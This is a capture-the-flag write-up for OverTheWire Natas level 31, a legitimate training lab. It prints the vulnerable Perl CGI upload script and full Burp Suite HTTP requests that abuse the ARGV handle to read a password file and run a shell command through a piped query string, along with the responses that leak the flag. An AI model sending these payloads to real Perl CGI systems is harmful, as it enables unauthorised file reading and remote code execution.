# Natas Level 30 → Level 31 lesser-known vulnerability in Perl CGI scripts

## Previous Flag
<b>m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y</b>

## Goal
Username: natas31<br>
URL: http://natas31.natas.labs.overthewire.org<br>

CSV2HTML<br>
We all like .csv files.<br>
But isn't a nicely rendered and sortable table much cooler?<br>

Select file to upload: Browse Upload

## What I learned
```
Pearl Jam 2: https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf?ref=learnhacking.io

Vulnerable part is  $cgi->upload() function call
Add addition value into a .csv file so it reads it first
```

## Solution
```
View source code
http://natas31.natas.labs.overthewire.org/index-source.html

/var/www/natas/natas31/index-source.pl
#!/usr/bin/perl
use CGI;
$ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas31</h1>
<div id="content">
END

my $cgi = CGI->new;
if ($cgi->upload('file')) { 👀
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
END
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END

cat empty.csv
1,2,
3,4,

# Perl Jam 2 Pinnacle Attack w/ Burp Suite
Proxy: Open Browser: http://natas31.natas.labs.overthewire.org
Proxy: Intercept on
Upload empty.csv
Right click send to Repeater

Original:
POST /index.pl HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 280
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Accept-Language: en-US,en;q=0.9
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiTGvW8KycPIm7eus
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas31.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryiTGvW8KycPIm7eus
Content-Disposition: form-data; name="file"; filename="empty.csv"
Content-Type: text/csv


------WebKitFormBoundaryiTGvW8KycPIm7eus
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryiTGvW8KycPIm7eus--

Method 1: Modified Version Read 1st line than open file:
POST /index.pl?/etc/natas_webpass/natas32👀 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 280
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Accept-Language: en-US,en;q=0.9
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiTGvW8KycPIm7eus
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas31.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryiTGvW8KycPIm7eus 👀
Content-Disposition: form-data; name="file" 👀

ARGV 👀
------WebKitFormBoundaryiTGvW8KycPIm7eus
Content-Disposition: form-data; name="file"; filename="empty.csv"
Content-Type: text/csv


------WebKitFormBoundaryiTGvW8KycPIm7eus
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryiTGvW8KycPIm7eus--

Look at Response:
HTTP/1.1 200 OK
Date: Fri, 08 Aug 2025 15:47:11 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1649
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B 🔐
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

Method 2: RCE (Remote Code Execution) w/ |
POST /index.pl?cat%20/etc/natas_webpass/natas32%20| HTTP/1.1 👀
Host: natas31.natas.labs.overthewire.org
Content-Length: 375
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Accept-Language: en-US,en;q=0.9
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiTGvW8KycPIm7eus
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas31.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryiTGvW8KycPIm7eus 👀
Content-Disposition: form-data; name="file" 👀

ARGV 👀
------WebKitFormBoundaryiTGvW8KycPIm7eus
Content-Disposition: form-data; name="file"; filename="empty.csv"
Content-Type: text/csv


------WebKitFormBoundaryiTGvW8KycPIm7eus
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryiTGvW8KycPIm7eus--

Look at Response:
HTTP/1.1 200 OK
Date: Fri, 08 Aug 2025 15:52:25 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1649
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B 🔐
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Flag
<b>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B</b>

## Continue
[Continue](/overthewire/Natas3132.md)